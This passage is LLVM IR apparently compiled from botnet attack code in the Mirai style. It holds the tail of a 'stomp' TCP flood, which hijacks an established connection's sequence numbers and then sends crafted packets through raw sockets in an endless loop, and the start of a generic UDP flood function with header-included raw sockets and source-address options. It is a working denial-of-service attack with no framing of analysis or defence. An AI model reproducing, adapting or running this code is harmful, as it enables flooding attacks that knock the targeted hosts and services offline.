  store %struct.tcphdr* %218, %struct.tcphdr** %35, align 8
  %219 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %220 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %219, i32 0, i32 0
  %221 = load i16, i16* %220, align 4
  %222 = zext i16 %221 to i32
  %223 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %224 = load i16, i16* %223, align 2
  %225 = zext i16 %224 to i32
  %226 = icmp eq i32 %222, %225
  br i1 %226, label %227, label %481

227:                                              ; preds = %215
  %228 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 4
  %230 = load i16, i16* %229, align 4
  %231 = lshr i16 %230, 9
  %232 = and i16 %231, 1
  %233 = zext i16 %232 to i32
  %234 = icmp ne i32 %233, 0
  br i1 %234, label %235, label %460

235:                                              ; preds = %227
  %236 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = lshr i16 %238, 12
  %240 = and i16 %239, 1
  %241 = zext i16 %240 to i32
  %242 = icmp ne i32 %241, 0
  br i1 %242, label %243, label %460

243:                                              ; preds = %235
  %244 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %245 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %244, i32 0, i32 0
  %246 = load i32, i32* %245, align 4
  %247 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %248 = load i32, i32* %9, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %247, i64 %249
  %251 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %250, i32 0, i32 0
  store i32 %246, i32* %251, align 4
  %252 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 2
  %254 = load i32, i32* %253, align 4
  %255 = call i32 @ntohl(i32 noundef %254) #8
  %256 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %257 = load i32, i32* %9, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %256, i64 %258
  %260 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %259, i32 0, i32 1
  store i32 %255, i32* %260, align 4
  %261 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %262 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %261, i32 0, i32 3
  %263 = load i32, i32* %262, align 4
  %264 = call i32 @ntohl(i32 noundef %263) #8
  %265 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %266 = load i32, i32* %9, align 4
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %265, i64 %267
  %269 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %268, i32 0, i32 2
  store i32 %264, i32* %269, align 4
  %270 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %271 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %270, i32 0, i32 1
  %272 = load i16, i16* %271, align 2
  %273 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %274 = load i32, i32* %9, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %273, i64 %275
  %277 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %276, i32 0, i32 3
  store i16 %272, i16* %277, align 4
  %278 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %279 = load i16, i16* %278, align 2
  %280 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %281 = load i32, i32* %9, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %280, i64 %282
  %284 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %283, i32 0, i32 4
  store i16 %279, i16* %284, align 2
  %285 = load i32, i32* %24, align 4
  %286 = sext i32 %285 to i64
  %287 = add i64 40, %286
  %288 = call noalias i8* @malloc(i64 noundef %287) #7
  %289 = load i8**, i8*** %12, align 8
  %290 = load i32, i32* %9, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds i8*, i8** %289, i64 %291
  store i8* %288, i8** %292, align 8
  %293 = load i8**, i8*** %12, align 8
  %294 = load i32, i32* %9, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds i8*, i8** %293, i64 %295
  %297 = load i8*, i8** %296, align 8
  %298 = bitcast i8* %297 to %struct.iphdr*
  store %struct.iphdr* %298, %struct.iphdr** %36, align 8
  %299 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %300 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %299, i64 1
  %301 = bitcast %struct.iphdr* %300 to %struct.tcphdr*
  store %struct.tcphdr* %301, %struct.tcphdr** %37, align 8
  %302 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i64 1
  %304 = bitcast %struct.tcphdr* %303 to i8*
  store i8* %304, i8** %38, align 8
  %305 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %306 = bitcast %struct.iphdr* %305 to i8*
  %307 = load i8, i8* %306, align 4
  %308 = and i8 %307, 15
  %309 = or i8 %308, 64
  store i8 %309, i8* %306, align 4
  %310 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %311 = bitcast %struct.iphdr* %310 to i8*
  %312 = load i8, i8* %311, align 4
  %313 = and i8 %312, -16
  %314 = or i8 %313, 5
  store i8 %314, i8* %311, align 4
  %315 = load i8, i8* %13, align 1
  %316 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %317 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %316, i32 0, i32 1
  store i8 %315, i8* %317, align 1
  %318 = load i32, i32* %24, align 4
  %319 = sext i32 %318 to i64
  %320 = add i64 40, %319
  %321 = trunc i64 %320 to i16
  %322 = call zeroext i16 @htons(i16 noundef zeroext %321) #8
  %323 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %324 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %323, i32 0, i32 2
  store i16 %322, i16* %324, align 2
  %325 = load i16, i16* %14, align 2
  %326 = call zeroext i16 @htons(i16 noundef zeroext %325) #8
  %327 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %328 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %327, i32 0, i32 3
  store i16 %326, i16* %328, align 4
  %329 = load i8, i8* %15, align 1
  %330 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 5
  store i8 %329, i8* %331, align 4
  %332 = load i8, i8* %16, align 1
  %333 = icmp ne i8 %332, 0
  br i1 %333, label %334, label %338

334:                                              ; preds = %243
  %335 = call zeroext i16 @htons(i16 noundef zeroext 16384) #8
  %336 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %337 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %336, i32 0, i32 4
  store i16 %335, i16* %337, align 2
  br label %338

338:                                              ; preds = %334, %243
  %339 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 6
  store i8 6, i8* %340, align 1
  %341 = load i32, i32* @LOCAL_ADDR, align 4
  %342 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %343 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %342, i32 0, i32 8
  store i32 %341, i32* %343, align 4
  %344 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %345 = load i32, i32* %9, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %344, i64 %346
  %348 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %347, i32 0, i32 0
  %349 = load i32, i32* %348, align 4
  %350 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i32 0, i32 9
  store i32 %349, i32* %351, align 4
  %352 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %353 = load i32, i32* %9, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %352, i64 %354
  %356 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %355, i32 0, i32 3
  %357 = load i16, i16* %356, align 4
  %358 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %359 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %358, i32 0, i32 0
  store i16 %357, i16* %359, align 4
  %360 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %361 = load i32, i32* %9, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %360, i64 %362
  %364 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %363, i32 0, i32 4
  %365 = load i16, i16* %364, align 2
  %366 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %367 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %366, i32 0, i32 1
  store i16 %365, i16* %367, align 2
  %368 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %369 = load i32, i32* %9, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %368, i64 %370
  %372 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %371, i32 0, i32 2
  %373 = load i32, i32* %372, align 4
  %374 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %375 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %374, i32 0, i32 2
  store i32 %373, i32* %375, align 4
  %376 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %377 = load i32, i32* %9, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %376, i64 %378
  %380 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %379, i32 0, i32 1
  %381 = load i32, i32* %380, align 4
  %382 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %383 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %382, i32 0, i32 3
  store i32 %381, i32* %383, align 4
  %384 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 4
  %386 = load i16, i16* %385, align 4
  %387 = and i16 %386, -241
  %388 = or i16 %387, 128
  store i16 %388, i16* %385, align 4
  %389 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %390 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %389, i32 0, i32 4
  %391 = load i16, i16* %390, align 4
  %392 = and i16 %391, -257
  %393 = or i16 %392, 256
  store i16 %393, i16* %390, align 4
  %394 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %395 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %394, i32 0, i32 4
  %396 = load i16, i16* %395, align 4
  %397 = and i16 %396, -4097
  %398 = or i16 %397, 4096
  store i16 %398, i16* %395, align 4
  %399 = call i32 @rand_next()
  %400 = and i32 %399, 65535
  %401 = trunc i32 %400 to i16
  %402 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %403 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %402, i32 0, i32 5
  store i16 %401, i16* %403, align 2
  %404 = load i8, i8* %18, align 1
  %405 = sext i8 %404 to i16
  %406 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %407 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %406, i32 0, i32 4
  %408 = load i16, i16* %407, align 4
  %409 = and i16 %405, 1
  %410 = shl i16 %409, 13
  %411 = and i16 %408, -8193
  %412 = or i16 %411, %410
  store i16 %412, i16* %407, align 4
  %413 = load i8, i8* %19, align 1
  %414 = sext i8 %413 to i16
  %415 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %416 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %415, i32 0, i32 4
  %417 = load i16, i16* %416, align 4
  %418 = and i16 %414, 1
  %419 = shl i16 %418, 12
  %420 = and i16 %417, -4097
  %421 = or i16 %420, %419
  store i16 %421, i16* %416, align 4
  %422 = load i8, i8* %20, align 1
  %423 = sext i8 %422 to i16
  %424 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 4
  %426 = load i16, i16* %425, align 4
  %427 = and i16 %423, 1
  %428 = shl i16 %427, 11
  %429 = and i16 %426, -2049
  %430 = or i16 %429, %428
  store i16 %430, i16* %425, align 4
  %431 = load i8, i8* %21, align 1
  %432 = sext i8 %431 to i16
  %433 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %434 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %433, i32 0, i32 4
  %435 = load i16, i16* %434, align 4
  %436 = and i16 %432, 1
  %437 = shl i16 %436, 10
  %438 = and i16 %435, -1025
  %439 = or i16 %438, %437
  store i16 %439, i16* %434, align 4
  %440 = load i8, i8* %22, align 1
  %441 = sext i8 %440 to i16
  %442 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %443 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %442, i32 0, i32 4
  %444 = load i16, i16* %443, align 4
  %445 = and i16 %441, 1
  %446 = shl i16 %445, 9
  %447 = and i16 %444, -513
  %448 = or i16 %447, %446
  store i16 %448, i16* %443, align 4
  %449 = load i8, i8* %23, align 1
  %450 = sext i8 %449 to i16
  %451 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %452 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %451, i32 0, i32 4
  %453 = load i16, i16* %452, align 4
  %454 = and i16 %450, 1
  %455 = shl i16 %454, 8
  %456 = and i16 %453, -257
  %457 = or i16 %456, %455
  store i16 %457, i16* %452, align 4
  %458 = load i8*, i8** %38, align 8
  %459 = load i32, i32* %24, align 4
  call void @rand_str(i8* noundef %458, i32 noundef %459)
  br label %491

460:                                              ; preds = %235, %227
  %461 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %462 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %461, i32 0, i32 4
  %463 = load i16, i16* %462, align 4
  %464 = lshr i16 %463, 8
  %465 = and i16 %464, 1
  %466 = zext i16 %465 to i32
  %467 = icmp ne i32 %466, 0
  br i1 %467, label %476, label %468

468:                                              ; preds = %460
  %469 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %470 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %469, i32 0, i32 4
  %471 = load i16, i16* %470, align 4
  %472 = lshr i16 %471, 10
  %473 = and i16 %472, 1
  %474 = zext i16 %473 to i32
  %475 = icmp ne i32 %474, 0
  br i1 %475, label %476, label %479

476:                                              ; preds = %468, %460
  %477 = load i32, i32* %26, align 4
  %478 = call i32 @close(i32 noundef %477)
  br label %121

479:                                              ; preds = %468
  br label %480

480:                                              ; preds = %479
  br label %481

481:                                              ; preds = %480, %215
  br label %482

482:                                              ; preds = %481, %211, %203
  %483 = call i64 @time(i64* noundef null) #7
  %484 = load i64, i64* %31, align 8
  %485 = sub nsw i64 %483, %484
  %486 = icmp sgt i64 %485, 10
  br i1 %486, label %487, label %490

487:                                              ; preds = %482
  %488 = load i32, i32* %26, align 4
  %489 = call i32 @close(i32 noundef %488)
  br label %121

490:                                              ; preds = %482
  br label %191

491:                                              ; preds = %338
  br label %492

492:                                              ; preds = %491, %124
  %493 = load i32, i32* %9, align 4
  %494 = add nsw i32 %493, 1
  store i32 %494, i32* %9, align 4
  br label %115, !llvm.loop !25

495:                                              ; preds = %115
  br label %496

496:                                              ; preds = %606, %495
  store i32 0, i32* %9, align 4
  br label %497

497:                                              ; preds = %603, %496
  %498 = load i32, i32* %9, align 4
  %499 = load i8, i8* %5, align 1
  %500 = zext i8 %499 to i32
  %501 = icmp slt i32 %498, %500
  br i1 %501, label %502, label %606

502:                                              ; preds = %497
  %503 = load i8**, i8*** %12, align 8
  %504 = load i32, i32* %9, align 4
  %505 = sext i32 %504 to i64
  %506 = getelementptr inbounds i8*, i8** %503, i64 %505
  %507 = load i8*, i8** %506, align 8
  store i8* %507, i8** %39, align 8
  %508 = load i8*, i8** %39, align 8
  %509 = bitcast i8* %508 to %struct.iphdr*
  store %struct.iphdr* %509, %struct.iphdr** %40, align 8
  %510 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %511 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %510, i64 1
  %512 = bitcast %struct.iphdr* %511 to %struct.tcphdr*
  store %struct.tcphdr* %512, %struct.tcphdr** %41, align 8
  %513 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %514 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %513, i64 1
  %515 = bitcast %struct.tcphdr* %514 to i8*
  store i8* %515, i8** %42, align 8
  %516 = load i16, i16* %14, align 2
  %517 = zext i16 %516 to i32
  %518 = icmp eq i32 %517, 65535
  br i1 %518, label %519, label %525

519:                                              ; preds = %502
  %520 = call i32 @rand_next()
  %521 = and i32 %520, 65535
  %522 = trunc i32 %521 to i16
  %523 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %524 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %523, i32 0, i32 3
  store i16 %522, i16* %524, align 4
  br label %525

525:                                              ; preds = %519, %502
  %526 = load i8, i8* %25, align 1
  %527 = icmp ne i8 %526, 0
  br i1 %527, label %528, label %531

528:                                              ; preds = %525
  %529 = load i8*, i8** %42, align 8
  %530 = load i32, i32* %24, align 4
  call void @rand_str(i8* noundef %529, i32 noundef %530)
  br label %531

531:                                              ; preds = %528, %525
  %532 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %533 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %532, i32 0, i32 7
  store i16 0, i16* %533, align 2
  %534 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %535 = bitcast %struct.iphdr* %534 to i16*
  %536 = call zeroext i16 @checksum_generic(i16* noundef %535, i32 noundef 20)
  %537 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %538 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %537, i32 0, i32 7
  store i16 %536, i16* %538, align 2
  %539 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %540 = load i32, i32* %9, align 4
  %541 = sext i32 %540 to i64
  %542 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %539, i64 %541
  %543 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %542, i32 0, i32 1
  %544 = load i32, i32* %543, align 4
  %545 = add i32 %544, 1
  store i32 %545, i32* %543, align 4
  %546 = trunc i32 %544 to i16
  %547 = call zeroext i16 @htons(i16 noundef zeroext %546) #8
  %548 = zext i16 %547 to i32
  %549 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %550 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %549, i32 0, i32 2
  store i32 %548, i32* %550, align 4
  %551 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %552 = load i32, i32* %9, align 4
  %553 = sext i32 %552 to i64
  %554 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %551, i64 %553
  %555 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %554, i32 0, i32 2
  %556 = load i32, i32* %555, align 4
  %557 = trunc i32 %556 to i16
  %558 = call zeroext i16 @htons(i16 noundef zeroext %557) #8
  %559 = zext i16 %558 to i32
  %560 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %561 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %560, i32 0, i32 3
  store i32 %559, i32* %561, align 4
  %562 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %563 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %562, i32 0, i32 6
  store i16 0, i16* %563, align 4
  %564 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %565 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %566 = bitcast %struct.tcphdr* %565 to i8*
  %567 = load i32, i32* %24, align 4
  %568 = sext i32 %567 to i64
  %569 = add i64 20, %568
  %570 = trunc i64 %569 to i16
  %571 = call zeroext i16 @htons(i16 noundef zeroext %570) #8
  %572 = load i32, i32* %24, align 4
  %573 = sext i32 %572 to i64
  %574 = add i64 20, %573
  %575 = trunc i64 %574 to i32
  %576 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %564, i8* noundef %566, i16 noundef zeroext %571, i32 noundef %575)
  %577 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %578 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %577, i32 0, i32 6
  store i16 %576, i16* %578, align 4
  %579 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %580 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %579, i32 0, i32 1
  %581 = load i16, i16* %580, align 2
  %582 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %583 = load i32, i32* %9, align 4
  %584 = sext i32 %583 to i64
  %585 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %582, i64 %584
  %586 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %585, i32 0, i32 0
  %587 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %586, i32 0, i32 1
  store i16 %581, i16* %587, align 2
  %588 = load i32, i32* %10, align 4
  %589 = load i8*, i8** %39, align 8
  %590 = load i32, i32* %24, align 4
  %591 = sext i32 %590 to i64
  %592 = add i64 40, %591
  %593 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %594 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %595 = load i32, i32* %9, align 4
  %596 = sext i32 %595 to i64
  %597 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %594, i64 %596
  %598 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %597, i32 0, i32 0
  %599 = bitcast %struct.sockaddr_in* %598 to %struct.sockaddr*
  store %struct.sockaddr* %599, %struct.sockaddr** %593, align 8
  %600 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %601 = load %struct.sockaddr*, %struct.sockaddr** %600, align 8
  %602 = call i64 @sendto(i32 noundef %588, i8* noundef %589, i64 noundef %592, i32 noundef 16384, %struct.sockaddr* %601, i32 noundef 16)
  br label %603

603:                                              ; preds = %531
  %604 = load i32, i32* %9, align 4
  %605 = add nsw i32 %604, 1
  store i32 %605, i32* %9, align 4
  br label %497, !llvm.loop !26

606:                                              ; preds = %497
  br label %496

607:                                              ; preds = %202, %111, %105
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_udpgeneric(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 noundef %29, i64 noundef 8) #7
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 noundef zeroext %32, %struct.attack_option* noundef %33, i8 noundef zeroext 2, i32 noundef 0)
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %12, align 1
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 noundef zeroext %36, %struct.attack_option* noundef %37, i8 noundef zeroext 3, i32 noundef 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 noundef zeroext %40, %struct.attack_option* noundef %41, i8 noundef zeroext 4, i32 noundef 64)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 noundef zeroext %44, %struct.attack_option* noundef %45, i8 noundef zeroext 5, i32 noundef 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 noundef zeroext %48, %struct.attack_option* noundef %49, i8 noundef zeroext 6, i32 noundef 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %16, align 2
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 noundef zeroext %52, %struct.attack_option* noundef %53, i8 noundef zeroext 7, i32 noundef 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %17, align 2
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 noundef zeroext %56, %struct.attack_option* noundef %57, i8 noundef zeroext 0, i32 noundef 512)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 noundef zeroext %60, %struct.attack_option* noundef %61, i8 noundef zeroext 1, i32 noundef 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %19, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = load i32, i32* @LOCAL_ADDR, align 4
  %67 = call i32 @attack_get_opt_int(i8 noundef zeroext %64, %struct.attack_option* noundef %65, i8 noundef zeroext 25, i32 noundef %66)
  store i32 %67, i32* %20, align 4
  %68 = load i16, i16* %18, align 2
  %69 = zext i16 %68 to i32
  %70 = icmp sgt i32 %69, 1460
  br i1 %70, label %71, label %72

71:                                               ; preds = %4
  store i16 1460, i16* %18, align 2
  br label %72

72:                                               ; preds = %71, %4
  %73 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 17) #7
  store i32 %73, i32* %10, align 4
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %76

75:                                               ; preds = %72
  br label %312

76:                                               ; preds = %72
  store i32 1, i32* %9, align 4
  %77 = load i32, i32* %10, align 4
  %78 = bitcast i32* %9 to i8*
  %79 = call i32 @setsockopt(i32 noundef %77, i32 noundef 0, i32 noundef 3, i8* noundef %78, i32 noundef 4) #7
  %80 = icmp eq i32 %79, -1
  br i1 %80, label %81, label %84

81:                                               ; preds = %76
  %82 = load i32, i32* %10, align 4
  %83 = call i32 @close(i32 noundef %82)
  br label %312

84:                                               ; preds = %76
  store i32 0, i32* %9, align 4
  br label %85

85:                                               ; preds = %167, %84
  %86 = load i32, i32* %9, align 4
  %87 = load i8, i8* %5, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp slt i32 %86, %88
  br i1 %89, label %90, label %170

90:                                               ; preds = %85
  %91 = call noalias i8* @calloc(i64 noundef 1510, i64 noundef 1) #7
  %92 = load i8**, i8*** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8*, i8** %92, i64 %94
  store i8* %91, i8** %95, align 8
  %96 = load i8**, i8*** %11, align 8
  %97 = load i32, i32* %9, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8*, i8** %96, i64 %98
  %100 = load i8*, i8** %99, align 8
  %101 = bitcast i8* %100 to %struct.iphdr*
